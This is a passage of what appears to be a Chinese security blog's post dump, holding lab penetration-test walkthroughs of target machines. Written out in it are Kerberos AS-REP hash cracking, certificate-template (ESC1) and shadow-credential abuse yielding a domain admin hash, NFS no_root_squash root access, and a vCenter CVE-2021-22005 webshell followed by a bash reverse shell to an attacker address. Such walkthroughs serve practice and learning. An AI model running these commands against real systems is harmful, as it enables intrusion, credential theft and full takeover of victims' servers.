是为了明确告诉 Shell：参数是纯字符串，不要对其进行通配符匹配、变量替换等解析操作\rroot@Halfhour:/home/wangjiang# cd /tmp\rroot@Halfhour:/tmp# touch A\rroot@Halfhour:/tmp# sudo /usr/local/bin/del.sh\rflag{root-4c850c5b3b2756e67a91bad8e046ddac}\rroot@Halfhour:/tmp# root@Halfhour:/tmp# 方法2 直接用前面bobobo密码登录\nwelcome@Halfhour:/home/wangjiang$ su root\rPassword: root@Halfhour:/home/wangjiang# whoami\rroot ","date":"18 September 2025","externalUrl":null,"permalink":"/posts/halfhour/","section":"Posts","summary":"","title":"Halfhour靶机-Maze-通配符漏洞","type":"posts"},{"content":"","date":"18 September 2025","externalUrl":null,"permalink":"/tags/wordpress/","section":"Tags","summary":"","title":"Wordpress","type":"tags"},{"content":"","date":"18 September 2025","externalUrl":null,"permalink":"/tags/%E9%80%9A%E9%85%8D%E7%AC%A6/","section":"Tags","summary":"","title":"通配符","type":"tags"},{"content":" Confidence靶机-Maze-windows-ESC1 # userflag # NMAP扫描端口\nnmap -sT -sC -p- 192.168.10.132 PORT STATE SERVICE\r53/tcp open domain\r88/tcp open kerberos-sec\r135/tcp open msrpc\r139/tcp open netbios-ssn\r389/tcp open ldap\r| ssl-cert: Subject: commonName=dc.confidence.com\r| Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.confidence.com\r| Not valid before: 2025-09-09T12:14:33\r|_Not valid after: 2026-09-09T12:14:33\r|_ssl-date: TLS randomness does not represent time\r445/tcp open microsoft-ds\r464/tcp open kpasswd5\r593/tcp open http-rpc-epmap\r636/tcp open ldapssl\r| ssl-cert: Subject: commonName=dc.confidence.com\r| Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.confidence.com\r| Not valid before: 2025-09-09T12:14:33\r|_Not valid after: 2026-09-09T12:14:33\r|_ssl-date: TLS randomness does not represent time\r3268/tcp open globalcatLDAP\r3269/tcp open globalcatLDAPssl\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: commonName=dc.confidence.com\r| Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.confidence.com\r| Not valid before: 2025-09-09T12:14:33\r|_Not valid after: 2026-09-09T12:14:33\r5985/tcp open wsman\r9389/tcp open adws\r49664/tcp open unknown\r49667/tcp open unknown\r49669/tcp open unknown\r59557/tcp open unknown\r59558/tcp open unknown\r59565/tcp open unknown\r59574/tcp open unknown\r59580/tcp open unknown\r59610/tcp open unknown\rMAC Address: 00:0C:29:F7:7B:D8 (VMware)\rHost script results:\r| smb2-time: | date: 2025-09-11T06:05:46\r|_ start_date: N/A\r|_nbstat: NetBIOS name: DC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:0c:29:f7:7b:d8 (VMware)\r| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required\r|_clock-skew: -3s\rNmap done: 1 IP address (1 host up) scanned in 247.87 seconds\r扫描完写入到hosts里面 先测试smb有无共享文件\n└─# crackmapexec smb 192.168.10.132 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares\rSMB 192.168.10.132 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:confidence.com) (signing:True) (SMBv1:False)\rSMB 192.168.10.132 445 DC [+] confidence.com\\: SMB 192.168.10.132 445 DC [-] Error enumerating shares: STATUS_ACCESS_DENIED\r# smbclient -L //192.168.10.132 Password for [WORKGROUP\\root]:\rSharename Type Comment\r--------- ---- -------\rADMIN$ Disk 远程管理\rC$ Disk 默认共享\rIPC$ IPC 远程 IPC\rNETLOGON Disk Logon server share readme Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing.\rdo_connect: Connection to 192.168.10.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\rUnable to connect with SMB1 -- no workgroup available 发现一个readme看看呢\n└─# smbclient //192.168.10.132/readme Password for [WORKGROUP\\root]:\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; ls\r. D 0 Tue Sep 9 09:25:09 2025\r.. DHS 0 Tue Sep 9 09:28:52 2025\rreadme.txt.txt A 273 Tue Sep 9 09:25:11 2025\r12923135 blocks of size 4096. 7950004 blocks available\rsmb: \\\u0026gt; get readme.txt.txt 没发现什么信息\r└─# cat /root/readme.txt.txt I\u0026#39;ve already disabled Windows Defender, and the system updates have been completed. So, enjoy exploring! If you run into any issues or get stuck, feel free to reach out to me, Wackymaker. My intention is simply to make sure everyone can learn something from this experience smb可以匿名试试 lookid获取下用户\n─# lookupsid.py lucy@192.168.10.132\r/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81.\rimport pkg_resources\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Password:\r[*] Brute forcing SIDs at 192.168.10.132\r[*] StringBinding ncacn_np:192.168.10.132[\\pipe\\lsarpc]\r[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491\r498: CONFIDENCE\\Enterprise Read-only Domain Controllers (SidTypeGroup)\r500: CONFIDENCE\\Administrator (SidTypeUser)\r501: CONFIDENCE\\Guest (SidTypeUser)\r502: CONFIDENCE\\krbtgt (SidTypeUser)\r512: CONFIDENCE\\Domain Admins (SidTypeGroup)\r513: CONFIDENCE\\Domain Users (SidTypeGroup)\r514: CONFIDENCE\\Domain Guests (SidTypeGroup)\r515: CONFIDENCE\\Domain Computers (SidTypeGroup)\r516: CONFIDENCE\\Domain Controllers (SidTypeGroup)\r517: CONFIDENCE\\Cert Publishers (SidTypeAlias)\r518: CONFIDENCE\\Schema Admins (SidTypeGroup)\r519: CONFIDENCE\\Enterprise Admins (SidTypeGroup)\r520: CONFIDENCE\\Group Policy Creator Owners (SidTypeGroup)\r521: CONFIDENCE\\Read-only Domain Controllers (SidTypeGroup)\r522: CONFIDENCE\\Cloneable Domain Controllers (SidTypeGroup)\r525: CONFIDENCE\\Protected Users (SidTypeGroup)\r526: CONFIDENCE\\Key Admins (SidTypeGroup)\r527: CONFIDENCE\\Enterprise Key Admins (SidTypeGroup)\r553: CONFIDENCE\\RAS and IAS Servers (SidTypeAlias)\r571: CONFIDENCE\\Allowed RODC Password Replication Group (SidTypeAlias)\r572: CONFIDENCE\\Denied RODC Password Replication Group (SidTypeAlias)\r1000: CONFIDENCE\\DC$ (SidTypeUser)\r1101: CONFIDENCE\\DnsAdmins (SidTypeAlias)\r1102: CONFIDENCE\\DnsUpdateProxy (SidTypeGroup)\r1103: CONFIDENCE\\ca-admin (SidTypeGroup)\r1104: CONFIDENCE\\ca-user (SidTypeUser)\r1105: CONFIDENCE\\mulis (SidTypeUser)\r1106: CONFIDENCE\\hyh (SidTypeUser) 发现用户hyh mulis ca-user\n然后用GetNPUsers.py 获取没有开启域认证的账号hash 成功获取mulis的然后用john解密\n#GetNPUsers.py -usersfile /root/maze/conficenceuser.txt -no-pass -dc-ip 192.168.10.132 confidence.com/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\r[-] User hyh doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r$krb5asrep$23$mulis@CONFIDENCE.COM:9757a526f685d1240449b7ccf2a4d87a$23f2b38d42eeddd793a20f980ab86d8e24807e64a9eeacef107b2e38258a8d154f8c8bc7ca17362af2ef366cd0fa87139a8f797a9b36ac1f478925688cbc16dd75d448e5a36a2da41c2dc8bd328ad51a2183b40c8d2e07386e79903d6a7cd021d4b549b774ea8f6c746f7551ca68dd5c93dd8779652c7995107c7bedd3d5521560c39f904c8cfd5e5ccf4b4625dd0ae684eebc34b0342fb654705d3965528c8edbac29ac6f2c2aa867e851b5df7a1a139e4f1a821ca7704b986dd400d6c53795b25639375d761c4ec6f46f96bb695b7123d6fc545930f3a8cd7104c75ab82fcf776831e1cfaea248a50a758bba1e5e9d\r[-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r#john --wordlist=/usr/share/wordlists/rockyou.txt /root/maze/hash\rbabygirl ($krb5asrep$23$mulis@CONFIDENCE.COM) 拿到后不知道干嘛了因为用evil登录不上去问问作者说查看ldap\nldapsearch -x -H ldap://192.168.10.132 -D \u0026#34;mulis@confidence.com\u0026#34; -w babygirl -b \u0026#34;DC=confidence,DC=com\u0026#34; \u0026#34;(objectClass=user)\u0026#34; sAMAccountName memberOf description servicePrincipalName\r获取hyh有下面一串\r# hyh, Users, confidence.com\rdn: CN=hyh,CN=Users,DC=confidence,DC=com\rdescription:: 6L+Z5p2h6Lev5piv5a+555qE77yM5L2G5piv5L2g55yL5Yiw55qE6L+Y5LiN5aSf\r5aSa\rmemberOf: CN=Remote Management Users,CN=Builtin,DC=confidence,DC=com\rsAMAccountName: hyh\rbase64后转换为utf-8得到不全面 意思我们ldap不全换命令 ldapsearch -x -H ldap://192.168.10.132 -D \u0026#34;mulis@confidence.com\u0026#34; -w babygirl -b \u0026#34;CN=hyh,CN=Users,DC=confidence,DC=com\u0026#34; \u0026#34;*\u0026#34;\r获得密码\rinfo: Password: 3948571026\r登录获得user\r*Evil-WinRM* PS C:\\Users\\hyh\u0026gt; cd Desktop\r*Evil-WinRM* PS C:\\Users\\hyh\\Desktop\u0026gt; dir\r目录: C:\\Users\\hyh\\Desktop\rMode LastWriteTime Length Name\r---- ------------- ------ ----\r-a---- 9/9/2025 9:28 PM 34 user.txt rootflag # 这里用bloodhound获取信息\nbloodhound-python -u hyh -p \u0026#34;3948571026\u0026#34; -d confidence.com -ns 192.168.10.132 -c All --zip\rINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\rINFO: Found AD domain: confidence.com\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc.confidence.com\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc.confidence.com\rINFO: Found 7 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc.confidence.com\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250911042039_bloodhound.zip\r放到里面 发送hyh对ca-user用户有可写权限直接可以获取他的hash 通过影子凭证\n影子凭证 # certipy shadow auto -username hyh@confidence.com -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132\nsource certipy-3.12-env/bin/activate 激活虚拟环境工具要求3.11\r└─# certipy shadow auto -username hyh@confidence.com -password 3948571026 -account ca-user -target dc.confidence.com -dc-ip 192.168.10.132\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Targeting user \u0026#39;ca-user\u0026#39;\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating Key Credential\r[*] Key Credential generated with DeviceID \u0026#39;6105a628c72a4425ae02b84c3ed67080\u0026#39;\r[*] Adding Key Credential with device ID \u0026#39;6105a628c72a4425ae02b84c3ed67080\u0026#39; to the Key Credentials for \u0026#39;ca-user\u0026#39;\r[*] Successfully added Key Credential with device ID \u0026#39;6105a628c72a4425ae02b84c3ed67080\u0026#39; to the Key Credentials for \u0026#39;ca-user\u0026#39;\r[*] Authenticating as \u0026#39;ca-user\u0026#39; with the certificate\r[*] Certificate identities:\r[*] No identities found in this certificate\r[*] Using principal: \u0026#39;ca-user@confidence.com\u0026#39;\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saving credential cache to \u0026#39;ca-user.ccache\u0026#39;\r[*] Wrote credential cache to \u0026#39;ca-user.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;ca-user\u0026#39;\r[*] Restoring the old Key Credentials for \u0026#39;ca-user\u0026#39;\r[*] Successfully restored the old Key Credentials for \u0026#39;ca-user\u0026#39;\r[*] NT hash for \u0026#39;ca-user\u0026#39;: 8636734a8c71b741a33bcb2bf323ea5c 获得了ca-user然后使用漏洞扫描扫描漏洞\n└─# certipy find -username ca-user -hashes :8636734a8c71b741a33bcb2bf323ea5c -dc-ip 192.168.10.132 -vulnerable\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Finding certificate templates\r[*] Found 35 certificate templates\r[*] Finding certificate authorities\r[*] Found 1 certificate authority\r[*] Found 12 enabled certificate templates\r[*] Finding issuance policies\r[*] Found 17 issuance policies\r[*] Found 0 OIDs linked to templates\r[*] Retrieving CA configuration for \u0026#39;confidence-DC-CA\u0026#39; via RRP\r[!] Failed to connect to remote registry. Service should be starting now. Trying again...\r[*] Successfully retrieved CA configuration for \u0026#39;confidence-DC-CA\u0026#39;\r[*] Checking web enrollment for CA \u0026#39;confidence-DC-CA\u0026#39; @ \u0026#39;dc.confidence.com\u0026#39;\r[!] Error checking web enrollment: timed out\r[!] Use -debug to print a stacktrace\r[!] Error checking web enrollment: timed out\r[!] Use -debug to print a stacktrace\r[*] Saving text output to \u0026#39;20250911052914_Certipy.txt\u0026#39;\r[*] Wrote text output to \u0026#39;20250911052914_Certipy.txt\u0026#39;\r[*] Saving JSON output to \u0026#39;20250911052914_Certipy.json\u0026#39;\r[*] Wrote JSON output to \u0026#39;20250911052914_Certipy.json\u0026#39;\rcat 20250911052914_Certipy.txt\r[+] User Enrollable Principals : CONFIDENCE.COM\\Domain Computers\rCONFIDENCE.COM\\ca-admin\r[!] Vulnerabilities\rESC1 : Enrollee supplies subject and template allows client authentication.\r发现漏洞ESC1 ESC1 # 1\n└─# certipy req -u ca-user@confidence.com -hashes :8636734a8c71b741a33bcb2bf323ea5c \\\r-ca confidence-DC-CA -target dc.confidence.com \\\r-template ca-login \\\r-upn administrator@confidence.com \\\r-sid S-1-5-21-3649830887-1815587496-1699028491-500 \\\r-out administrator \\\r-dc-ip 192.168.10.132\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Requesting certificate via RPC\r[*] Request ID is 10\r[*] Successfully requested certificate\r[*] Got certificate with UPN \u0026#39;administrator@confidence.com\u0026#39;\r[*] Certificate object SID is \u0026#39;S-1-5-21-3649830887-1815587496-1699028491-500\u0026#39;\r[*] Saving certificate and private key to \u0026#39;administrator.pfx\u0026#39;\rFile \u0026#39;administrator.pfx\u0026#39; already exists. Overwrite? (y/n - saying no will save with a unique filename): [*] Wrote certificate and private key to \u0026#39;administrator_1abcd36f-ea00-404e-955c-50be33193359.pfx\u0026#39;\rcertipy req\tcertipy 的 “证书请求” 子命令，用于向域 CA 申请证书\r-u ca-user@confidence.com\t指定用于请求证书的账号：域用户 ca-user（UPN 格式，confidence.com 为目标域）\r-hashes :8636734a8c71b741a33bcb2bf323ea5c\t指定 ca-user 的 NTLM 哈希（: 前为空表示不使用 LM 哈希，仅用 NT 哈希；该哈希是 ca-user 的身份凭证，无需明文密码）\r-ca confidence-DC-CA\t指定目标域的证书颁发机构（CA）名称：confidence-DC-CA（通常域控会作为 CA，格式为 “域 - 域控 - CA”）\r-target dc.confidence.com\t指定证书请求的目标服务器：域控 dc.confidence.com（CA 服务运行在域控上）\r-template ca-login\t指定用于请求证书的 “证书模板”：ca-login（需是域内可用于身份认证的模板，且 ca-user 有该模板的申请权限）\r-upn administrator@confidence.com\t关键伪造参数：将证书的 “用户主体名（UPN）” 设为 administrator@confidence.com（即伪装成域管理员账号）\r-sid S-1-5-21-...-500\t关键伪造参数：将证书关联的 SID 设为管理员的 SID（-500 是域管理员的默认 SID，确保证书被识别为管理员身份）\r-out administrator\t指定输出文件前缀：生成的证书和私钥文件以 administrator 命名\r-dc-ip 192.168.10.132\t指定域控的 IP 地址：避免 DNS 解析问题，直接通过 IP 连接域控 2 获得NT hash\n└─# certipy auth -pfx administrator_1abcd36f-ea00-404e-955c-50be33193359.pfx -dc-ip 192.168.10.132 Certipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Certificate identities:\r[*] SAN UPN: \u0026#39;administrator@confidence.com\u0026#39;\r[*] SAN URL SID: \u0026#39;S-1-5-21-3649830887-1815587496-1699028491-500\u0026#39;\r[*] Security Extension SID: \u0026#39;S-1-5-21-3649830887-1815587496-1699028491-500\u0026#39;\r[*] Using principal: \u0026#39;administrator@confidence.com\u0026#39;\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saving credential cache to \u0026#39;administrator.ccache\u0026#39;\rFile \u0026#39;administrator.ccache\u0026#39; already exists. Overwrite? (y/n - saying no will save with a unique filename): [*] Wrote credential cache to \u0026#39;administrator_3460f055-68bf-49c8-a389-5a8afc641fee.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@confidence.com\u0026#39;: aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34\rcertipy auth\tcertipy 的 “证书认证” 子命令，用于通过 PFX 证书完成 Kerberos 认证\r-pfx administrator_xxx.pfx\t指定上一步生成的伪造证书文件（包含管理员身份的证书和私钥）\r-dc-ip 192.168.10.132\t直接指定域控 IP，确保顺利连接 命令执行流程与结果：\n证书身份验证：certipy 读取 PFX 文件中的证书，向域控证明 “自己是 administrator”（因证书的 UPN 和 SID 均为管理员信息）；\n获取 TGT：域控验证证书有效后，颁发 “票证授予票据（TGT）”（管理员权限的 TGT），并保存为 administrator_xxx.ccache（Kerberos 凭证缓存文件）；\n提取管理员哈希：利用管理员权限的 TGT，进一步从域控中读取 administrator 的 NT 哈希，最终输出结果： aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34\n先利用 ca-user 的权限（可能是之前通过 GenericWrite 获取的权限），申请一张 “伪装成管理员” 的证书；\n再用这张伪造证书完成域认证，获取管理员权限的 Kerberos 凭证，最终提取出管理员的 NT 哈希；\n拿到管理员哈希后，可进一步通过 pass-the-hash（哈希传递）直接登录域控，实现完全控制。\n登录\npsexec.py administrator@192.168.10.132 -hashes aad3b435b51404eeaad3b435b51404ee:bbabdc192282668fe5190ab0c5150b34\r4\r/usr/local/lib/python3.10/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools\u0026lt;81.\rimport pkg_resources\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 192.168.10.132.....\r[*] Found writable share ADMIN$\r[*] Uploading file UTLKILTt.exe\r[*] Opening SVCManager on 192.168.10.132.....\r[*] Creating service bROc on 192.168.10.132.....\r[*] Starting service bROc.....\r[!] Press help for extra shell commands\r[-] Decoding error detected, consider running chcp.com at the target,\rmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\rand then execute smbexec.py again with -codec and the corresponding codec\rMicrosoft Windows [�汾 10.0.20348.4052]\r[-] Decoding error detected, consider running chcp.com at the target,\rmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\rand then execute smbexec.py again with -codec and the corresponding codec\r(c) Microsoft Corporation����������Ȩ����\rC:\\Windows\\system32\u0026gt; whoami\rnt authority\\system ","date":"12 September 2025","externalUrl":null,"permalink":"/posts/confidence/","section":"Posts","summary":"","title":"Confidence靶机-Maze-windows","type":"posts"},{"content":"","date":"12 September 2025","externalUrl":null,"permalink":"/tags/ldap/","section":"Tags","summary":"","title":"Ldap","type":"tags"},{"content":"","date":"12 September 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"10 September 2025","externalUrl":null,"permalink":"/tags/mount/","section":"Tags","summary":"","title":"Mount","type":"tags"},{"content":"","date":"10 September 2025","externalUrl":null,"permalink":"/tags/mountnfs/","section":"Tags","summary":"","title":"Mountnfs","type":"tags"},{"content":" Mount靶机-Maze # 信息收集 # NMAP扫描端口\n└─# nmap 172.20.10.2 -sT -p- -sC Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-10 02:27 EDT\rNmap scan report for 172.20.10.2\rHost is up (0.00042s latency).\rNot shown: 65526 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r22/tcp open ssh\r| ssh-hostkey: | 3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\r| 256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\r|_ 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\r79/tcp open finger\r| finger: \\x0D\r| Welcome to Linux version 4.19.0-27-amd64 at Mount !\\x0D\r| | 02:27:19 up 3 min, 0 users, load average: 0.04, 0.01, 0.00\r| \\x0D\r|_No one logged on.\\x0D\r80/tcp open http\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r111/tcp open rpcbind\r| rpcinfo: | program version port/proto service\r| 100000 2,3,4 111/tcp rpcbind\r| 100000 2,3,4 111/udp rpcbind\r| 100000 3,4 111/tcp6 rpcbind\r| 100000 3,4 111/udp6 rpcbind\r| 100003 3 2049/udp nfs\r| 100003 3 2049/udp6 nfs\r| 100003 3,4 2049/tcp nfs\r| 100003 3,4 2049/tcp6 nfs\r| 100005 1,2,3 37701/udp mountd\r| 100005 1,2,3 45501/tcp6 mountd\r| 100005 1,2,3 48026/udp6 mountd\r| 100005 1,2,3 51187/tcp mountd\r| 100021 1,3,4 34593/tcp nlockmgr\r| 100021 1,3,4 43233/tcp6 nlockmgr\r| 100021 1,3,4 48578/udp nlockmgr\r| 100021 1,3,4 49562/udp6 nlockmgr\r| 100227 3 2049/tcp nfs_acl\r| 100227 3 2049/tcp6 nfs_acl\r| 100227 3 2049/udp nfs_acl\r|_ 100227 3 2049/udp6 nfs_acl\r2049/tcp open nfs_acl\r34593/tcp open nlockmgr\r35695/tcp open unknown\r51187/tcp open mountd\r60235/tcp open unknown\rMAC Address: 08:00:27:8D:16:16 (Oracle VirtualBox virtual NIC)\rNmap done: 1 IP address (1 host up) scanned in 12.42 seconds NFS 服务（2049/111/51187 端口）：高风险\rNFS（网络文件系统）是最需关注的服务，若配置不当易导致 文件泄露或未授权访问：\r风险：若 NFS 共享目录未限制客户端 IP、未设置权限（如 no_root_squash 配置），攻击者可能挂载共享目录，读取 / 修改敏感文件（如系统配置、用户数据）。\r验证建议：执行 showmount -e 172.20.10.2（需本地安装 nfs-common 工具），查看 NFS 共享的目录及权限配置。 showmount -e 172.20.10.2\nshowmount -e 172.20.10.2\rExport list for 172.20.10.2:\r/home/ll104567 *\r发现可以挂载“允许所有客户端访问” 的方式共享（* 表示无 IP 限制） 挂载拿到用户shell # mkdir -p /mnt/nfs_test\rmount -t nfs 172.20.10.2:/home/ll104567 /mnt/nfs_test\rcd nfs_test cd: 权限不够: nfs_test 提示权限不够就创建这个用户进去放入ssh密码登录\ruseradd -u 6666 nfs_user\rmkdir .ssh\recho \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChJ31EeTjZIw5tz/8b2Ma6XyrjI6+FSUfbnWRF7HA6/pMtgTbZGPhKXRzdigHq2NY40KSz7xpeDvpZEbdCjpCiimXfwgALaZpI/GxftyA4C9yWoSQxR7jdK8dWAurA9rnoPnwrOO8F14rg2P2vknrtR70eIklAwbuDvJ8Aq9Ai5tMPaiOx2uJAYRWYRgOd/jP4WhZ8nF88N+E963xFf/Bf37AMV4SVujvasubsmM96t7fOqEBgzyK+xTClVqhzzGKhcr5AfYDvemDnffXEC3Ff+cdkXpW8HhX8FrK6D2HzwpOIN/8hypJNkGssXOZ9E4rTWWoY84VtPvceYMUI7xV44VskmZMLYrBAxfPDzEJV/HHKX1xQXwsHg7WiSRntApPS3BfeMr8ZqJTSBqoTVAnoMAuClPy1Vm1c+mlzvjlCbBBLfLEWNvuslzR9rQMFpMwLN3PoBhyGZ5+gv94QPbicLhNuLdU10KD5dHLtWUoWIGOu2RqtcjjKul+fT62BPy8= root@kali\u0026#34; \u0026gt; authorized_keys\r$ ls -al\r总用量 12\rdrwxrwxr-x 2 nfs_user nfs_user 4096 9月 10 02:33 .\rdrwx------ 3 nfs_user nfs_user 4096 9月 10 02:32 ..\r-rw-rw-r-- 1 nfs_user nfs_user 563 9月 10 02:33 authorized_keys 登录 拿到ll用户\n└─# ssh ll104567@172.20.10.2 -i /root/.ssh/id_rsa Linux Mount 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\rThe programs included with the Debian GNU/Linux system are free software;\rthe exact distribution terms for each program are described in the\rindividual files in /usr/share/doc/*/copyright.\rDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\rpermitted by applicable law.\rLast login: Wed Aug 20 23:46:24 2025 from 192.168.3.94\rll104567@Mount:~$ ll104567@Mount:~$ ls\rll104567@Mount:~$ ls -al 这里发现还有个用户guest爆破得到密码lalala获得user.txt\n[22][ssh] host: 172.20.10.2 login: guest password: lalala 提权root # 这里发现可以重启并且我们对exports这NFC关键文件可以写就可以连用来提权\nl104567@Mount:~$ sudo -l\rMatching Defaults entries for ll104567 on Mount:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser ll104567 may run the following commands on Mount:\r(ALL) NOPASSWD: /sbin/reboot\rll104567@Mount:~$ ls -al /etc/exports -rw-rw---- 1 root ll104567 49 Sep 10 04:03 /etc/exports\rll104567@Mount:~$ 修改文件内容为\n/root *(rw,sync,no_root_squash,no_subtree_check) sudo /sbin/reboot 就会应用配置然后我们重新挂载\n┌──(root㉿kali)-[/mnt/nfs_test2]\r└─# showmount -e 172.20.10.2\rExport list for 172.20.10.2:\r/root *\rmkdir -p /mnt/nfs_test3 ┌──(root㉿kali)-[/mnt/nfs_test2]\r└─# mount -t nfs 172.20.10.2:/home/ll104567 /mnt/nfs_test3\rCreated symlink \u0026#39;/run/systemd/system/remote-fs.target.wants/rpc-statd.service\u0026#39; → \u0026#39;/usr/lib/systemd/system/rpc-statd.service\u0026#39;.\rmount.nfs: mounting 172.20.10.2:/home/ll104567 failed, reason given by server: No such file or directory\r┌──(root㉿kali)-[/mnt/nfs_test2]\r└─# mount -t nfs 172.20.10.2:/root /mnt/nfs_test3\r┌──(root㉿kali)-[/mnt/nfs_test2]\r└─# cd /mnt/nfs_test3\r┌──(root㉿kali)-[/mnt/nfs_test3]\r└─# ls root.txt ","date":"10 September 2025","externalUrl":null,"permalink":"/posts/mount/","section":"Posts","summary":"","title":"Mount靶机-maze","type":"posts"},{"content":"","date":"4 September 2025","externalUrl":null,"permalink":"/tags/esxi/","section":"Tags","summary":"","title":"Esxi","type":"tags"},{"content":"","date":"4 September 2025","externalUrl":null,"permalink":"/tags/vmware/","section":"Tags","summary":"","title":"Vmware","type":"tags"},{"content":" vmware-esxi-vscenter-靶场vulntarget-o # https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg提取码: 2dwq 下载靶场\nWP 靶机WP\n奇安信攻防社区-记一次攻防演练之vcenter后渗透利用\n安装配置 # ESXi 是 VMware 的裸金属虚拟化 hypervisor（直接安装在物理服务器硬件上），核心功能是创建、运行和管理虚拟机；vCenter Server 是集中管理平台，用于统一管控多台 ESXi 主机及上面的所有虚拟机，实现规模化运维。 这个靶机相当于在一个主机里面创建了两个虚拟机 攻击他的vxcenter相当于拿到了堡垒机进行跳板\n就和阿里云的面板相似\n设置为NAT模式 设置网段为10\n打开配置\n启动虚拟机\n相关密码\nesxi ：192.168.10.128 进入后启动PC vcenter和win7\n● 账号：root\n● 密码：Vulntarget@123\nvcenter：192.168.10.129\n● 账号：administrator@vsphere.local\n● 密码：Admin@vulntarget123\nWindows7：192.168.10.*（dhcp）\n● 账号：vulntarget\n● 密码：Vulntarget\nhttps://192.168.10.129/访问后启动客户端\n渗透测试 # 这种面板就和阿里的一样点击画面就进去了可以操作\n发现了vcenter客户端\ncve-2021-22005 # 使用cve-2021-22005-exp-main\r来一个哥斯拉后门\rpython exp.py -s 11.jsp -t https://192.168.10.129/\r[*] target: https://192.168.10.129\r[*] webshell: 11.jsp\r[*] creating agent\r[*] uploading manifest\r[!] webshell url: https://192.168.10.129/idm/..;/tgpz9j.jsp\r自动生成payload哥斯拉连接\rwebshell是没有交互的 反弹个shell来\rbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.10.1/6666 0\u0026gt;\u0026amp;1 反弹SHELL\rnc -lvvp 6666\rlistening on [any] 6666 ...\r192.168.10.129: inverse host lookup failed: h_errno 11004: NO_DATA\rconnect to [192.168.10.1] from (UNKNOWN) [192.168.10.129] 35096: NO_DATA\rbash: cannot set terminal process group (1747): Inappropriate ioctl for device\rbash: no job control in this shell\rwhoami\rroot 重置vcenter密码 这个不推荐 可以看上面那个社区其他攻击方法\n/usr/lib/vmware-vmdir/bin/vdcadmintool 重置密码\nPlease enter account UPN : administrator@vsphere.local\r==================\rPlease select:\r0. exit\r1. Test LDAP connectivity\r2. Force start replication cycle\r3. Reset account password\r4. Set log level and mask\r5. Set vmdir state\r6. Get vmdir state\r7. Get vmdir log level and mask\r==================\rNew password is -\rqx[cKy5r@0-OP+p{Xw\u0026#39;@ 拿到密码登录 进入VCENTER # 进入后我们要拿下这个win7可以上传恶意的iso镜像来达成-使用克隆虚拟机\nVMware vSphere Client 环境下克隆的虚拟机不需要本机启动就能启动，是因为虚拟机本身具备相对独立性\n先上传到数据库中 kon-bootCD.iso\n再克隆\n选中自定义\n选中镜像 